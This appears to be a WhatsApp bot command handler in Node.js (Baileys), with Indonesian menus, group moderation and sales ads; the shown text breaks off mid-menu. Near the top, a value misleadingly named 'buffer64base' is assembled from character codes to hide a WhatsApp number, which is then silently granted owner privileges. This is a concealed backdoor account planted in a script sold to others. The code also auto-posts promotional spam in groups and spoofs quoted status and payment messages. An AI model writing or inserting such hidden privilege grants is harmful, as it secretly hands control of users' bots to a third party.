process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys');

const { LoadDataBase } = require('./src/message');
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const list = JSON.parse(fs.readFileSync("./database/list.json"))
const { OrderKuota } = require("./lib/orderkuota")
const orderkuota = new OrderKuota()
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, encryptCode } = require('./lib/function');


module.exports = danz = async (danz, m, chatUpdate, store) => {
	try {
await LoadDataBase(danz, m)
const botNumber = await danz.decodeJid(danz.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.mess || quoted).mimetype || ''
const qmess = (quoted.mess || quoted)


//============== [ MESSAGE ] ================================================

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

if (isCmd) {
console.log(chalk.cyan.bold(` ╭─────[ COMMAND NOTIFICATION ]`), chalk.blue.bold(`\n  Command :`), chalk.white.bold(`${prefix+command}`), chalk.blue.bold(`\n  From :`), chalk.white.bold(m.isGroup ? `Group - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.cyan.bold(`╰────────────────────────────\n`))
}

//============= [ FAKEQUOTED ] ===============================================

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `${botname2} By ${namaOwner}`,jpegThumbnail: await reSize("./image/dnzMg.jpg", 200, 200) }}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}


//============= [ EVENT GROUP ] ===============================================

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].simi == true && !isCmd) {
try {
let res = await axios.get(`https://simsimi.site/api/v2/?mode=talk&lang=id&message=${m.text}&filter=true`)
if (res.data.success) {
await m.reply(res.data.success)
}
} catch (e) {}
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await danz.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await danz.sendMessage(m.chat, {text: `*#- [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await danz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await danz.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await danz.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await danz.sendMessage(m.chat, {text: `*#- [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await danz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await danz.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await danz.sendMessage(m.chat, {text: `
*DanzXzo Menyediakan 🌟*
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Marga Xzo Yuk*
* *Grup Marga Xzo:*
https://chat.whatsapp.com/FyqffgGmrNYK1b52xECZtk
* *Channel Developer Xzo:*
https://whatsapp.com/channel/0029VanWm2F0rGiQROzHWG1W
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VayzScQAYlUNjXxhJf1Z

*👤 Contact DanzXzo*
* *WhatsApp Utama :*
+6285664637742
* *Telegram Utama*
https://t.me/devdx
`}, {quoted: null})
}
}


if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}
}

//============= [ FUNCTION ] ======================================================

const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return danz.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnail: fs.readFileSync("./image/dnzMg.jpg"), 
sourceUrl: null, 
}}}, {quoted: null})
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./image/dnzMg.jpg") }, { upload: danz.waUploadToServer })
const messii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*DanzXzo* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*DanzXzo Menyediakan 🌟*

* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Marga Xzo Yuk*
* *Grup Marga Xzo:*
https://chat.whatsapp.com/FyqffgGmrNYK1b52xECZtk
* *Channel Developer Xzo:*
https://whatsapp.com/channel/0029VanWm2F0rGiQROzHWG1W
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VayzScQAYlUNjXxhJf1Z

*👤 Contact DanzXzo*
* *WhatsApp Utama :*
+6285664637742
* *Telegram Utama*
https://t.me/devdx`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp1000

* Ram 2 GB : Rp2000

* Ram 3 GB : Rp3000

* Ram 4 GB : Rp4000

* Ram 5 GB : Rp5000

* Ram 6 GB : Rp6000

* Ram 7 GB : Rp7000

* Ram 8 GB : Rp8000

* Ram 9 GB : Rp9000

* Ram Unlimited : Rp10.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Jasa Suntik Sosmed 🌟*

*- Layanan Instagram :*
- 500 Followers : Rp8000
- 1000 Like : Rp4000
- 1000 Views : Rp4000

*- Layanan Tiktok :*
* 500 Followers : Rp5000
* 1000 Like : Rp5000
* 1000 Share : Rp5000
* 10k Views : Rp3000

*- Layanan Telegram :*
* 500 Member CH : Rp8000

*- Layanan Whats'App :*
* 100 Member CH : Rp12.000

*Syarat & Ketentuan :*
* _Proses tidak memerlukan email/password akun, hanya memakai username/link tautan_
* _Selama proses akun jangan di private/dibatasi_
* _Masing masing layanan mempunyai garansi & non garansi_
* _Proses maksimal 1 x 24jam, Order wajib sabar!_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await danz.relayMessage(jid, messii.message, {messageId: messii.key.id})
}

//============= [ COMMANDS ] ====================================================

switch (command) {
case "help": {
let menu = ` 
Are you again looking for help finding the bot menu? Let's follow the steps below.

𝙹𝚒𝚔𝚊 𝚔𝚊𝚖𝚞 𝚒𝚗𝚐𝚒𝚗 𝚖𝚎𝚗𝚊𝚖𝚙𝚒𝚕𝚔𝚊𝚗 𝚖𝚎𝚗𝚞 𝚔𝚎𝚝𝚒𝚔
.menud

𝙹𝚒𝚔𝚊 𝚔𝚊𝚖𝚞 𝚒𝚗𝚐𝚒𝚗 𝚖𝚎𝚗𝚊𝚖𝚙𝚒𝚕𝚔𝚊𝚗 𝚌𝚙𝚊𝚗𝚎𝚕 𝚖𝚎𝚗𝚞 𝚔𝚎𝚝𝚒𝚔
.menucpanel
`
let buttons = [
  {
    buttonId: ".menud", 
    buttonText: { 
      displayText: "Allmenu"
    }
  }, {
    buttonId: ".tqto", 
    buttonText: {
      displayText: "TQTO"
    }
  }
 ];

    let buttonMessage = {
        text: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: qtext });
};
break

case "tqto": {
let menu = `
I am very grateful for your help, because it helped me to create this script.

𝐓𝐡𝐚𝐧𝐤 𝐘𝐨𝐮 𝐓𝐨

ᴅᴀɴᴢʜᴏsᴛɪɴɢ ( ᴅᴇᴠᴇʟᴏᴘᴇʀ )
ʟɪɴᴋ ᴄʜᴀɴɴᴇʟ : https://whatsapp.com/channel/0029VayzScQAYlUNjXxhJf1Z
ʏᴏᴜᴛᴜʙᴇ : ɴᴏᴛ ғᴏᴜɴᴅ

sᴋʏᴢᴏᴘᴇᴅɪᴀ ( ᴍʏ ғʀɪᴇɴᴅ )
ʟɪɴᴋ ᴄʜᴀɴɴᴇʟ : https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s
ʏᴏᴜᴛᴜʙᴇ : @skyzodev

ᴡᴀɴʜᴏsᴛɪɴɢ ( ᴍʏ ғʀɪᴇɴᴅ )
ʟɪɴᴋ ᴄʜᴀɴɴᴇʟ : ɴᴏᴛ ғᴏᴜɴᴅ
ʏᴏᴜᴛᴜʙᴇ : ɴᴏᴛ ғᴏᴜɴᴅ

> DanzBotz V2 - Update 2025
`
let buttons = [
  {
    buttonId: ".cpanelbutton", 
    buttonText: { 
      displayText: "Create — Panel"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Owner"
    }
  }
 ];

    let buttonMessage = {
       image: { url: "https://img101.pixhost.to/images/628/556415534_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m })
};
break
case "menunew": case "p": case "v3": case "bokep": {
let teksnya = `
 ╭─ *〣 Information Bot 〣*
 │ • *Botname :* ${global.botname}
 │ • *Creator :* ${global.owner}
 │ • *Botmode :* ${danz.public ? "Public Mode" : "Self Mode"}
 │ • *Library :* @whiskeysocket
 ╰ • *Uptime :* ${runtime(process.uptime())}
 `
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
documentMessage: {"url": "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
"mimetype": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"fileLength": 99999999999,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `𝐎𝐥𝐚 𝐈𝐦 𝐃𝐚𝐧𝐳𝐁𝐨𝐭𝐳`,
"directPath": "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
"contactVcard": true,
"mediaKeyTimestamp": "1658703206"
}
}), 
footer: proto.Message.InteractiveMessage.Footer.create({
 text: `Powered by DanzHosting`
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "Click Here", "sections": [{ "title": "- Please select one of the menu lists", "rows": [{ "title": "Allmenu", "description": "All bot features", "id": ".menud" }, 
{ "title": "Produkmenu", "description": "Bot owner product list", "id": ".shopmenu" }]}, 
{ "title": "- Tools bot owner features", "rows": [{ "title": "Startjpmslide", "description": "Start jpmslide all group", "id": ".jpmslide" }, 
{ "title": "CreatePanel", "description": "Cpanel via bot", "id": ".menucpanel" }]}
]}`
}, 
{
"name": "cta_call",
"buttonParamsJson": `{\"display_text\": \"Contact Owner\", 
\"phone_number\": "+${global.owner}"}`
}, 
{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Marketplace\",\"url\":\"${global.linkGrup}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}), 
contextInfo: {
externalAdReply: {
containsAutoReply: true, 
title: `© ${global.botname} Version 0.3`,
thumbnail: await global.imgmenu,
sourceUrl: linkGrup,
renderLargerThumbnail: true, 
mediaType: 1
}}
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await danz.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break


case 'menu': {
let menu = `╭──────✦───────────╮
     *乂 𝐌𝐞𝐧𝐮 𝐃𝐚𝐧𝐳𝐁𝐨𝐭𝐳 𝐕𝟐 乂*
╰──────✦───────────╯

┏❐
┃• Creator : 🌟 ${global.namaOwner}
┃• Botz : ⚙️ ${global.botname}
┗❐

*🔔INFO PROFILE*
➤ Number : ${m.sender.split("@")[0]}
➤ Status : ${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}
`
let flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Popular Menu",
                    sections: [
                        {
                            title: "This Popular Menu",
                            highlight_label: "Powered By Danz",
                            rows: [
                                {
                                    title: "𝗔𝗹𝗹𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Tampilkan semua menu botz",
                                    id: ".menud"
                                 },
                                                                {                                                                
                                    title: "𝗦𝗹𝗶𝗱𝗲",
                                    description: "JPM Otomatis teks slide button",
                                    id: ".jpmslide"
                                },
                                                                {
                                    title: "𝗦𝗹𝗶𝗱𝗲",
                                    description: "JPM Otomatis teks slide button hidetag",
                                    id: ".jpmslideht"
                                },
                                                                {
                                    title: "𝗖𝗽𝗮𝗻𝗲𝗹-𝗩𝟭",
                                    description: "Membuat Cpanel",                                                       
                                    id: ".cprandom"
                                },
                                                                {
                                   title: "𝗖𝗽𝗮𝗻𝗲𝗹-𝗩𝟮",
                                    description: "Membuat Cpanel",                                                       
                                    id: ".cprandom2"
                                   },
                                                                {
                                  title: "𝗖𝗽𝗮𝗻𝗲𝗹-𝗩𝟯",
                                    description: "Membuat Cpanel",                                                       
                                    id: ".cprandom3"
                                   },
                                                                {
                                   title: "𝗖𝗽𝗮𝗻𝗲𝗹-𝗩𝟰",
                                    description: "Membuat Cpanel",                                                       
                                    id: ".cprandom4"
                                   },
                                                                {
                                    title: "𝗖𝗽𝗮𝗻𝗲𝗹-𝗩𝟱",
                                    description: "Membuat Server Private",
                                    id: ".cprandom5"
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ]

    await danz.sendMessage(m.chat, {
        image: { url: "https://img101.pixhost.to/images/628/556415534_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: [...flowActions],
        viewOnce: true,
        headerType: 6
    }, { quoted: m })
};
break
case 'menud': {
let menu = `╭─────────✦───────────╮
     *乂 𝐌𝐞𝐧𝐮 𝐃𝐚𝐧𝐳𝐁𝐨𝐭𝐳 𝐕𝟐 乂*
╰─────────✦───────────╯

┏❐
┃• Creator : 🌟 ${global.namaOwner}
┃• Botz : ⚙️ ${global.botname}
┗❐

*🔔INFO PROFILE*
➤ Number : ${m.sender.split("@")[0]}
➤ Status : ${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}
© Copyright DanzBotz V2 — Update 2025`
let flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Popular Menu",
                    sections: [
                        {
                            title: "This Popular Menu",
                            highlight_label: "",
                            rows: [
                                {
                                    title: "𝗔𝗹𝗹𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Tampilkan semua menu botz",
                                    id: ".menud"
                                },
                                                                {
                                    title: "𝗢𝘁𝗵𝗲𝗿𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Tampilkan menu other",
                                    id: ".othermenu"
                                },
                                                                {
                                    title: "𝗦𝗲𝗮𝗿𝗰𝗵𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Tampilkan menu search",
                                    id: ".searchmenu"
                                },
                                                                {
                                    title: "𝗧𝗼𝗼𝗹𝘀𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Tampilkan menu tools V1",
                                    id: ".toolsmenu"
                                },
                                                                {
                                    title: "𝗦𝗵𝗼𝗽𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Tampilkan menu Shop Otomatis",
                                    id: ".shopmenu"
                                },
                                                                {
                                    title: "𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Tampilkan menu download",
                                    id: ".downloadmenu"
                                },
                                                                {
                                    title: "𝗦𝘁𝗼𝗿𝗲𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Melihat Menustore",
                                    id: ".storemenu"
                                },
                                                                {
                                    title: "𝗣𝗮𝗻𝗲𝗹𝗺𝗲𝗻𝘂𝘀𝗲𝗹𝗹𝗲𝗿",
                                    description: "⚙️ Melihat Menupanelseller",
                                    id: ".menucpanel"
                                },
                                                                {
                                    title: "𝗣𝗮𝗻𝗲𝗹𝗺𝗲𝗻𝘂𝗼𝘄𝗻𝗲𝗿",
                                    description: "⚙️ Melihat Menupanelowner",
                                    id: ".menucpanel"
                                },
                                                                {
                                    title: "𝗹𝗻𝘀𝘁𝗮𝗹𝗹𝗲𝗿𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Melihat Menuinstaller",
                                    id: ".toolsmenu"
                                   },
                                                                {
                                    title: "𝗚𝗿𝗼𝘂𝗽𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Melihat Menugroup",
                                    id: ".groupmenu"
                                   },
                                                               {
                                    title: "𝗕𝘂𝘆𝗦𝗰𝗿𝗶𝗽𝘁",
                                    description: "⚙️ Menampilkan Menu Harga + Buy Script",
                                    id: ".buyscript"
                                   },
                                                                {
                                    title: "𝗢𝘄𝗻𝗲𝗿𝗺𝗲𝗻𝘂",
                                    description: "⚙️ Melihat Menuowner",
                                    id: ".ownermenu"
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ]

    await danz.sendMessage(m.chat, {
        image: { url: "https://img101.pixhost.to/images/628/556415534_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: [...flowActions],
        viewOnce: true,
        headerType: 6
    }, { quoted: m })
};
break

case "buyscript": {
let menu = `
sᴄʀɪᴘᴛ ɪɴɪ ᴅɪ ᴊᴜᴀʟ ᴅᴇɴɢᴀɴ ʜᴀʀɢᴀ 35K ғʀᴇᴇ ᴜᴘᴅᴀᴛᴇ, ɴᴇɢᴏ? ɴᴏ ᴜᴘᴅᴀᴛᴇ

ɪɴɢɪɴ ᴍᴇᴍʙᴇʟɪ? sɪʟᴀʜᴋᴀɴ ᴘᴇɴᴄᴇᴛ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ
`
let buttons = [
  {
    buttonId: ".menud", 
    buttonText: { 
      displayText: "Back To Frist Menu"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Owner"
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img101.pixhost.to/images/628/556415534_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    }

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "shopmenu": {
let menu = `
𝐈𝐧𝐠𝐢𝐧 𝐦𝐞𝐦𝐛𝐞𝐥𝐢 𝐤𝐞𝐛𝐮𝐭𝐮𝐡𝐚𝐧 𝐡𝐨𝐬𝐭𝐢𝐧𝐠 ? 𝐬𝐢𝐥𝐚𝐡𝐤𝐚𝐧 𝐩𝐢𝐥𝐢𝐡 𝐦𝐞𝐧𝐮 𝐲𝐚𝐧𝐠 𝐚𝐝𝐚 𝐝𝐢 𝐛𝐚𝐰𝐚𝐡
`
let buttons = [
  {
    buttonId: ".hargapanel", 
    buttonText: { 
      displayText: "Buy Panel"
    }
  }, {
    buttonId: ".hargavps", 
    buttonText: {
      displayText: "Buy Vps"
    }
  }, {
    buttonId: ".buyscript", 
    buttonText: {
      displayText: "Buy Script"
    }
  }
 ];

    let buttonMessage = {
        image: { url: "https://img101.pixhost.to/images/628/556415534_skyzopedia.jpg" },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `DanzBotz V2`
            }
        },
        footer: "© Copyright DanzBotz 2 - Update 2025",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    await danz.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "hargapanel": {
let menu = `
\`𝗣𝗮𝗻𝗲𝗹 𝗣𝘂𝗯𝗹𝗶𝗰 𝗗𝗮𝗻𝘇𝗵𝗼𝘀𝘁𝗶𝗻𝗴📡\`
𝚁𝙰𝙼 𝟷 𝙲𝙿𝚄𝟷 *𝟷𝙺*
𝚁𝙰𝙼 𝟸 𝙲𝙿𝚄𝟸 *𝟸𝙺*
